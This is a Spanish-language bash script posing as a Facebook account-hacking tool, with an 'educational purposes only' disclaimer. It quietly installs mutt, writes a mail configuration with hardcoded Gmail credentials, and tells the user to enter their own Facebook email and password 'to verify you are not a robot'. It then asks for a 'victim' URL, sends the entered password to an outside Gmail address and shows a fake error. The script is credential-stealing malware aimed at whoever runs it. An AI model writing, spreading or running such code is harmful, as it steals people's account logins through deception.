#!/bin/bash


Magenta='\033[1;35m'
Red='\033[1;31m'
Amarillo='\033[1;33m'
Goke='\033[92m'

EMAIL="robot.boot.2021@gmail.com"

command -v mutt >/dev/null || apt install pip mutt >/dev/null 2>&1

if [ ! -e $HOME/.muttrc ]; then


echo "set from=\"datos.robot.bot@gmail.com\"" >> $HOME/.muttrc
echo "set realname=\"ROBOTS\"" >> $HOME/.muttrc
echo "set imap_user=\"datos.robot.bot@gmail.com\"" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "# v1.0.1" >> $HOME/.muttrc
echo "# check the following google help page:" >> $HOME/.muttrc
echo "# http://support.google.com/accounts/bin/answer.py?answer=185833" >> $HOME/.muttrc
echo "# that is set here your google application password" >> $HOME/.muttrc
echo "set imap_pass=\"Abc_12345\"" >> $HOME/.muttrc
echo "#nopeset imap_authenticators=\"gssapi\"" >> $HOME/.muttrc
echo "set imap_authenticators=\"gssapi:cram-md5:login\"" >> $HOME/.muttrc
echo "set certificate_file=\"~/.mutt/certificates\"" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
iecho "# These two lines appear to be needed on some Linux distros, like Arch Linux" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "##REMOTE GMAIL FOLDERS" >> $HOME/.muttrc
echo "set folder=\"imaps://imap.gmail.com:993\"" >> $HOME/.muttrc
echo "set record=\"+[Gmail]/Sent Mail\"" >> $HOME/.muttrc
echo "set spoolfile=\"imaps://imap.gmail.com:993/INBOX\"" >> $HOME/.muttrc
echo "set postponed=\"+[Gmail]/Drafts\"" >> $HOME/.muttrc
echo "set trash=\"+[Google Mail]/Trash\"" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "###SMTP Settings to sent email" >> $HOME/.muttrc
echo "set smtp_url=\"smtp://datos.robot.bot@smtp.gmail.com:587\"" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "# v1.0.1" >> $HOME/.muttrc
echo "# check the following google help page:" >> $HOME/.muttrc
echo "# http://support.google.com/accounts/bin/answer.py?answer=185833" >> $HOME/.muttrc
echo "# that is set here your google application password" >> $HOME/.muttrc
echo "set smtp_pass=\"Abc_12345\"" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "###LOCAL FOLDERS FOR CACHED HEADERS AND CERTIFICATES" >> $HOME/.muttrc
echo "set header_cache=\"~/.mutt/cache/headers\"" >> $HOME/.muttrc
echo "set message_cachedir=\"~/.mutt/cache/bodies\"" >> $HOME/.muttrc
echo "set certificate_file =~/.mutt/certificates" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "###SECURING" >> $HOME/.muttrc
echo "set move=no  #Stop asking to \"move read messages to mbox\"!"
echo "set imap_keepalive=900" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "###Sort by newest conversation first." >> $HOME/.muttrc
echo "set sort=reverse-threads" >> $HOME/.muttrc
echo "set sort_aux=last-date-received" >> $HOME/.muttrc
echo "#" >> $HOME/.muttrc
echo "###Set editor to create new email" >> $HOME/.muttrc
echo "set editor=\'vim\'" >> $HOME/.muttrc
echo "set ssl_starttls=yes" >> $HOME/.muttrc
echo "set ssl_force_tls=yes" >> $HOME/.muttrc

fi

#echo "ESCRIBA SU CUENTA DE FACEBOOK" |

printf "$Goke""\nESTE SCRIP ESTA ECHO CON FINES EDUCATIVOS NO ME HAGO RESPONSABLE DEL MAL USO QUE HAGAN DE ESTA HERRAMIENTA\n."

printf "$Amarillo""\nSCRIP CREADO POR: "$Magenta"DarkHack90\n"

printf "$Goke""\nACONTINUACION INICIE SESION CON SU CUENTA DE FABOOK PARA VERIFICAR QUE NO ERES UN ROBOT:\n\n\n"

printf "$Magenta"


while read -p  "Escriba su correo >>" email && [ -z " $email" ]; do
	printf "\nEscriba un email correcto\n\n"
done

while read -p "Contraseña >>"  clave && [ -z  "$clave" ]; do                                printf "\nClave incorrecta\n\n"
done

printf "$Goke""\nConectando al servidor....\n"
printf "$Goke""\nValidando cuenta......\n\n"


printf "$Magenta"

while read -p "Cuenta de la victima (url):"  cuenta && [ -z  "$cuenta" ]; do                                printf "\nClave incorrecta\n\n"
done

echo $clave | mutt -s "$email" $EMAIL >/dev/null  2>&1

printf "$Red""\nA ocurrido un error, asegurese de haber escrito su cuenta de Facebook correctamente.\n"
